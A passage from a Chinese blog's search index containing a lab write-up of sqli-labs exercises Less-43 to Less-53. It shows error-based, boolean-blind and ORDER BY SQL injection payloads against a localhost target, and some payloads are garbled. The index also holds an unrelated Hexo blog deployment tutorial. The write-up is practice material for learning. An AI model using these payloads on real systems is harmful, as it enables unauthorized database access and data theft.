–+&amp;mysubmit&#x3D;Login</p></blockquote><p>测试出sql语句是<code>&#39;)</code>闭合，payload与上题类似。</p><blockquote><p>login_user&#x3D;root&amp;login_password&#x3D;1’） or updatexml(1,concat(0x2829,(select version())),1) –+&amp;mysubmit&#x3D;Login</p></blockquote><h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><h3 id="POST字符型层次化查询盲注"><a href="#POST字符型层次化查询盲注" class="headerlink" title="POST字符型层次化查询盲注"></a>POST字符型层次化查询盲注</h3><p>测试：</p><blockquote><p>login_user&#x3D;root&amp;login_password&#x3D;0’ or 1&#x3D;1 –+&amp;mysubmit&#x3D;Login</p><p>login_user&#x3D;root&amp;login_password&#x3D;0” or 1&#x3D;1 –+&amp;mysubmit&#x3D;Login</p></blockquote><p>发现这题没有回显了，使用boolenBased盲注。</p><p>payload:</p><blockquote><p>64 –+&amp;mysubmit&#x3D;Login</p></blockquote><p>可以写脚本跑或是sqlmap跑</p><h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><h3 id="POST括号字符型层次化查询盲注"><a href="#POST括号字符型层次化查询盲注" class="headerlink" title="POST括号字符型层次化查询盲注"></a>POST括号字符型层次化查询盲注</h3><p>测试：</p><blockquote><p>login_user&#x3D;root&amp;login_password&#x3D;0’ or 1&#x3D;1 –+&amp;mysubmit&#x3D;Login</p><p>login_user&#x3D;root&amp;login_password&#x3D;0’) or 1&#x3D;1 –+&amp;mysubmit&#x3D;Login</p></blockquote><p>测试出sql语句是<code>&#39;)</code>闭合，payload与上题类似。</p><p>payload：</p><blockquote><p>64 –+&amp;mysubmit&#x3D;Login</p></blockquote><h2 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h2><h3 id="GET数字型基于错误的orderby从句注入"><a href="#GET数字型基于错误的orderby从句注入" class="headerlink" title="GET数字型基于错误的orderby从句注入"></a>GET数字型基于错误的orderby从句注入</h3><p>测试：</p><blockquote><p><a href="http://localhost/Less-46/?sort=1%27%20or%201=1%20--+">http://localhost/Less-46/?sort=1%27%20or%201=1%20--+</a>“</p><p><a href="http://localhost/Less-46/?sort=1%20%20or%201=1%20--+">http://localhost/Less-46/?sort=1%20%20or%201=1%20--+</a>“</p></blockquote><p>判断为数字型注入</p><blockquote><p><a href="http://localhost/Less-46/?sort=1%20%20desc">http://localhost/Less-46/?sort=1%20%20desc</a>“</p></blockquote><p>orderby从句注入</p><p>源码：</p><p><img src="/img/sql/order.png"></p><p><code>order by</code>从句的注入，查了一下，感觉跟之前的也是大同小异。有报错还是可以使用<code>updatexml</code>或是<code>extractvalue</code>。</p><p>payload：</p><blockquote><p><a href="http://localhost/Less-46/?sort=1%20or%20%20updatexml(1,concat(0x2829,version()),1)%20--+">http://localhost/Less-46/?sort=1%20or%20%20updatexml(1,concat(0x2829,version()),1)%20--+</a>“</p></blockquote><h2 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h2><h3 id="GET字符型基于错误的orderby从句注入"><a href="#GET字符型基于错误的orderby从句注入" class="headerlink" title="GET字符型基于错误的orderby从句注入"></a>GET字符型基于错误的orderby从句注入</h3><p>测试：</p><blockquote><p><a href="http://localhost/Less-46/?sort=1%27%20or%201=1%20--+">http://localhost/Less-46/?sort=1%27%20or%201=1%20--+</a>“</p><p><a href="http://localhost/Less-46/?sort=1%20%20or%201=1%20--+">http://localhost/Less-46/?sort=1%20%20or%201=1%20--+</a>“</p></blockquote><p>判断为字符型注入</p><p>payload：</p><blockquote><p><a href="http://localhost/Less-46/?sort=1%27or%20%20updatexml(1,concat(0x2829,version()),1)%20--+">http://localhost/Less-46/?sort=1%27or%20%20updatexml(1,concat(0x2829,version()),1)%20--+</a>“</p></blockquote><h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><h3 id="GET数字型的orderby从句盲注"><a href="#GET数字型的orderby从句盲注" class="headerlink" title="GET数字型的orderby从句盲注"></a>GET数字型的orderby从句盲注</h3><p>测试:</p><blockquote><p><a href="http://localhost/Less-48/?sort=0%27%20or%201=1%20%20--+(%E6%97%A0%E5%9B%9E%E6%98%BE)">http://localhost/Less-48/?sort=0%27%20or%201=1%20%20--+(无回显)</a></p><p><a href="http://localhost/Less-48/?sort=0%20or%201=1%20%20--+%EF%BC%88%E6%9C%89%E5%9B%9E%E6%98%BE%EF%BC%89">http://localhost/Less-48/?sort=0%20or%201=1%20%20--+（有回显）</a></p></blockquote><p>数字型</p><p>尝试了使用boolenBased注入。常规的boolenBased方式用不了，上网查了查</p><p>payload：</p><blockquote><p><a href="http://localhost/Less-48/?sort=(select+1+regexp+if(substring(database(),1,1)=0x73,1,0x00">http://localhost/Less-48/?sort=(select+1+regexp+if(substring(database(),1,1)=0x73,1,0x00</a>“</p></blockquote><p>原理为1与<code>if</code>语句正则匹配，database()第一个字符&#x3D;0x73为真则if为1，则regexp匹配结果为1，否则为0。</p><p>sqlmap跑的payload：</p><blockquote><p>[<a href="http://localhost/Less-48/?sort=(select%5D(http://localhost/Less-48/?sort=(select)">http://localhost/Less-48/?sort=(select](http://localhost/Less-48/?sort=(select)</a>“)(case when (7459&#x3D;7459) then 7459 else 7459 *(select 7459 from information_schema.plugins) end))</p></blockquote><h2 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h2><h3 id="GET字符型orderby从句盲注"><a href="#GET字符型orderby从句盲注" class="headerlink" title="GET字符型orderby从句盲注"></a>GET字符型orderby从句盲注</h3><p>测试：</p><blockquote><p><a href="http://localhost/Less-49/?sort=0%20or%201=1">http://localhost/Less-49/?sort=0%20or%201=1</a>“</p></blockquote><p>payload：</p><blockquote><p><a href="http://localhost/Less-49/?sort=0%27%20%20or%20%201=(select+1+regexp+if(substring(database(),1,1)=0x72,1,0x00))%20--+">http://localhost/Less-49/?sort=0%27%20%20or%20%201=(select+1+regexp+if(substring(database(),1,1)=0x72,1,0x00))%20--+</a>“</p></blockquote><p>sqlmap跑user()的盲注语句：</p><blockquote><ul><li>THEN 3452 ELSE 3452 _(SELECT 3452 FROM INFORMATION_SCHEMA.PLUGINS)<br>END))</li></ul></blockquote><h2 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h2><h3 id="GET数字型orderby从句层次化查询注入"><a href="#GET数字型orderby从句层次化查询注入" class="headerlink" title="GET数字型orderby从句层次化查询注入"></a>GET数字型orderby从句层次化查询注入</h3><p>测试：</p><blockquote><p><a href="http://localhost/Less-50/?sort=0%27%20or%201=1%20--+">http://localhost/Less-50/?sort=0%27%20or%201=1%20--+</a>“</p><p><a href="http://localhost/Less-50/?sort=0%20or%201=1%20--+">http://localhost/Less-50/?sort=0%20or%201=1%20--+</a>“</p><p><a href="http://localhost/Less-50/?sort=0%20desc--+">http://localhost/Less-50/?sort=0%20desc--+</a>“</p></blockquote><p>判断为数字型orderby从句注入</p><p>payload同<code>Less46</code></p><h2 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h2><h3 id="GET字符型orderby从句层次化查询注入"><a href="#GET字符型orderby从句层次化查询注入" class="headerlink" title="GET字符型orderby从句层次化查询注入"></a>GET字符型orderby从句层次化查询注入</h3><p>测试：</p><blockquote><p><a href="http://localhost/Less-51/?sort=0%27%20or%201=1%20--+">http://localhost/Less-51/?sort=0%27%20or%201=1%20--+</a>“</p><p><a href="http://localhost/Less-51/?sort=0%20or%201=1%20--+">http://localhost/Less-51/?sort=0%20or%201=1%20--+</a>“</p><p><a href="http://localhost/Less-51/?sort=0%27%20desc--+">http://localhost/Less-51/?sort=0%27%20desc--+</a>“</p></blockquote><p>单引号字符型orderby从句注入</p><p>payload同<code>Less-47</code></p><h2 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h2><h3 id="GET数字型orderby从句层次化查询盲注"><a href="#GET数字型orderby从句层次化查询盲注" class="headerlink" title="GET数字型orderby从句层次化查询盲注"></a>GET数字型orderby从句层次化查询盲注</h3><p>测试:</p><blockquote><p><a href="http://localhost/Less-52/?sort=0%27%20or%201=1%20--+">http://localhost/Less-52/?sort=0%27%20or%201=1%20--+</a>“</p><p><a href="http://localhost/Less-52/?sort=0%20or%201=1%20--+">http://localhost/Less-52/?sort=0%20or%201=1%20--+</a>“</p><p><a href="http://localhost/Less-52/?sort=0%27%20desc--+">http://localhost/Less-52/?sort=0%27%20desc--+</a>“</p></blockquote><p>数字型orderby从句注入</p><p>payload同Less-48</p><h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><h3 id="GET字符型orderby从句层次化查询盲注"><a href="#GET字符型orderby从句层次化查询盲注" class="headerlink" title="GET字符型orderby从句层次化查询盲注"></a>GET字符型orderby从句层次化查询盲注</h3><p>测试:</p><blockquote><p><a href="http://localhost/Less-53/?sort=0%27%20or%201=1%20--+">http://localhost/Less-53/?sort=0%27%20or%201=1%20--+</a>“</p><p><a href="http://localhost/Less-53/?sort=0%20or%201=1%20--+">http://localhost/Less-53/?sort=0%20or%201=1%20--+</a>“</p><p><a href="http://localhost/Less-53/?sort=0%27%20desc--+">http://localhost/Less-53/?sort=0%27%20desc--+</a>“</p></blockquote><p>字符型orderby从句注入</p><p>payload同Less-49</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>从这一部分中学到了一些<code>绕过注入</code>、<code>层次化查询注入</code>和<code>orderby从句注入</code>的一些思路。学到了很多东西，但是感觉这一部分的题目重复性有些偏大，套路有点单一。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Macos 上hexo部署及配置</title>
      <link href="/2017/10/22/Macos-%E4%B8%8Ahexo%E9%83%A8%E7%BD%B2%E5%8F%8A%E9%85%8D%E7%BD%AE/"/>
      <url>/2017/10/22/Macos-%E4%B8%8Ahexo%E9%83%A8%E7%BD%B2%E5%8F%8A%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="Macos-上hexo部署及配置"><a href="#Macos-上hexo部署及配置" class="headerlink" title="Macos 上hexo部署及配置"></a>Macos 上hexo部署及配置</h1><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>之前是在阿里云上用WordPress搭的一个服务器。由于服务器快到期了，再加上Wordpress一直有爆漏洞,就决定使用静态页面挂在GitHub上搭博客了。使用的是Hexo，比较方便，而且主题也挺好看。用篇文章记录一下，顺便练习一下Markdown。</p><h2 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h2><h3 id="GitHub账号"><a href="#GitHub账号" class="headerlink" title="GitHub账号"></a>GitHub账号</h3><p>注册即可，无需翻墙。</p><h3 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h3><p><a href="http://nodejs.cn/download/" title="Node.js">Node.js</a> 官网下载安装即可。</p><h3 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h3><p>安装Xcode时，会自带Git，如果没有就安装下Xcode或者Xcode的工具。</p><h3 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h3><p>首先创建一个放置博客系统的文件夹，这个文件夹就是你的博客的根目录，进入到文件夹，执行如下命令安装：</p><p><code>sudo npm install -g hexo</code></p><p>接着初始化：</p><p><code>hexo init</code></p><p>还需要安装一个上传博客到GitHub的工具：</p><p><code>npm install hexo-deployer-git --save</code></p><h2 id="0x02-GitHub配置"><a href="#0x02-GitHub配置" class="headerlink" title="0x02 GitHub配置"></a>0x02 GitHub配置</h2><h3 id="仓库创建"><a href="#仓库创建" class="headerlink" title="仓库创建"></a>仓库创建</h3><p>建立与你的GitHub账户名对应的仓库，仓库名为<code>Your_name.github.io</code>。</p><p>接着配置你的hexo与该账号关联，在当前目录中的_config.yml中：</p><p><img src="/img/hexoblog/1.png"></p><p><code>type</code>: <code>git</code></p><p><code>repo</code>： <code>https://github.com/Your_name/Your_name.github.io.git</code></p><p><code>branch</code>: <code>master</code></p><p>特别要注意的是yml文件中的每个冒号后面需要一个空格。</p><p>然后在命令行中，配置你的GitHub信息：</p><p><code>git config --global user.name &quot;Yourname&quot;</code></p><p><code>git config --global user.email &quot;YourEmail&quot;</code></p><p>然后在命令行中，创建SSH key:</p><p><code>ssh-keygen -t rsa -C &quot;YourEmail&quot;</code></p><p>然后:</p><p><code>cd ~/.ssh</code></p><p><code>cat id_rsa.pub</code></p><p>然后将这个文件的内容复制下来。进入到你的GitHub账号-&gt;Settings-&gt;SSH and GPG keys，点击<code>NewSSH Key</code>，<code>title</code>随便填，<code>key</code>填你刚才复制的东西。然后保存即可。</p><h2 id="0x03-博客配置"><a href="#0x03-博客配置" class="headerlink" title="0x03 博客配置"></a>0x03 博客配置</h2><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><ul><li>hexo clean 清除静态文件(有些主题)<br>*   hexo generate 编译静态文件<br>*   hexo deploy 上传到你的GitHub<br>*   hexo server 在本地部署，在浏览器中输入localhost:4000即可预览<br>*   hexo new “文章名” 创建一篇文章，会在博客根目录下的source&#x2F;_post&#x2F;下生成一个<code>文章名.md</code>的文件，在这个md里编辑文章即可。</li></ul><p>一般上传就使用hexo g &amp;&amp; hexo d 即可</p><h3 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h3><p>都是在 _config.yml里配置：</p><ul><li><code>title</code>: <code>你的博客名字</code></li><li><code>language</code>: <code>zh-CN</code></li><li><code>theme</code>: <code>你要使用的主题，在根目录下的themes里</code></li></ul><h3 id="主题更换"><a href="#主题更换" class="headerlink" title="主题更换"></a>主题更换</h3><p>hexo有很多好看的主题，<a href="https://www.zhihu.com/question/24422335" title="知乎–有哪些好看的hexo主题">知乎–有哪些好看的hexo主题</a></p><p>选个喜欢的主题，它的GitHub上会有部署的教程。</p><p>基本步骤是，在博客的根目录下的themes目录下，创建你要使用的主题的文件夹，进入文件夹，然后git clone 主题的仓库地址。跟主题相关的配置一般都在该主题的文件夹下的_config.yml里。</p><p>别忘了在_config.yml里更改<code>theme</code>的值</p><h2 id="0x04-域名绑定"><a href="#0x04-域名绑定" class="headerlink" title="0x04 域名绑定"></a>0x04 域名绑定</h2><p>现在要想访问你的blog的地址是 Your_name.github.io,你可以绑定到你注册过的域名。</p><p>先改一下DNS解析，我是在阿里云买的,直接在阿里云的控制台里,更改我的域名的解析,记录类型是CNAME，就是一个跳转，主机记录是设置你的二级域名，记录值填你原来的博客地址。</p><p><img src="/img/hexoblog/2.png"></p><p>然后在你博客的根目录的<code>Source</code>文件夹下，创建一个<code>CNAME</code>文件，在文件里写下你购买的域名。</p><p>如我是<code>https://blog.yoyolllh.top</code></p><p>然后再 <code>hexo g &amp;&amp; hexo d</code> 重新上传一下就可以通过你的域名访问了。</p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>踩了许多的坑，小小总结一下</p><ul><li>在更换主题时，严格按照主题的README操作。</li><li>绑定域名记得一定要创建<code>CNAME</code>文件，光在GitHub上绑定域名没有用，每次你重新上传时它都会解除绑定。</li><li>使用 <code>hexo g --config source/_data/next.yml</code>重新指定配置文件生成静态文件。</li><li>有些主题配置后仍使用不了，可以试试 <code>hexo clean</code>命令。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
